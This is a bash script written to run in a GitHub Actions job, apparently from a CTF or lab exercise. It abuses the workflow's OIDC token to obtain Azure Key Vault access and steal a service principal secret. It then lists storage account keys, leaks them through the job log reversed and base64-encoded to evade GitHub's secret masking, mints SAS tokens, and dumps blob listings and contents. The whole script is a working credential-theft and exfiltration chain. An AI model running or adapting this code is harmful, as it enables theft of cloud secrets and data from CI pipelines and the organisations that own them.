#!/usr/bin/env bash
set -x
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

SPSEC=$(curl -s -H "Authorization: Bearer $KV" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r .value)
SA=$(echo "$SPSEC"|jq -r .appId); SK=$(echo "$SPSEC"|jq -r .clientSecret)

SPMG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" \
  --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)

# Get cilogs storage key
KEYS=$(curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-05-01")
KEY1=$(echo "$KEYS" | jq -r '.keys[0].value')

# Exfil key by encoding it (reverse + base64 to avoid GitHub secret masking)
echo "EXFIL_KEY1=$(echo "$KEY1" | rev | base64)"

# Use the key to generate SAS and read ALL storage accounts
# First: generate account SAS for cilogs
echo "=== SAS FOR CILOGS ==="
SAS=$(curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listAccountSas?api-version=2023-05-01" \
  -d '{"signedServices":"b","signedResourceTypes":"sco","signedPermission":"rl","signedProtocol":"https","signedStart":"2026-10-01T00:00:00Z","signedExpiry":"2026-12-01T00:00:00Z"}')
echo "SAS_RAW=$(echo "$SAS" | jq -r '.accountSasToken' | rev | base64)"

# Use SAS to list containers + read blobs
SASTOKEN=$(echo "$SAS" | jq -r '.accountSasToken')
echo "=== CILOGS LIST ==="
curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list&$SASTOKEN" | head -c 2000
echo

# List blobs in each container
for C in ci-logs logs config data flag internal artifacts; do
  echo "=== cilogs/$C blobs ==="
  curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/$C?restype=container&comp=list&$SASTOKEN" | head -c 2000
  echo
done

# Read any blobs found
for C in ci-logs logs; do
  BLOBS=$(curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/$C?restype=container&comp=list&$SASTOKEN" | grep -oP '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g')
  for B in $BLOBS; do
    echo ">>> cilogs/$C/$B:"
    curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/$C/$B?$SASTOKEN" | head -c 1000
    echo
  done
done

# Also check: can sync-service listKeys on sttblappcfgprodx3euoz?
echo "=== LISTKEYS appcfg with sync-service ==="
curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-05-01" | jq -c .

echo "=== DONE ==="
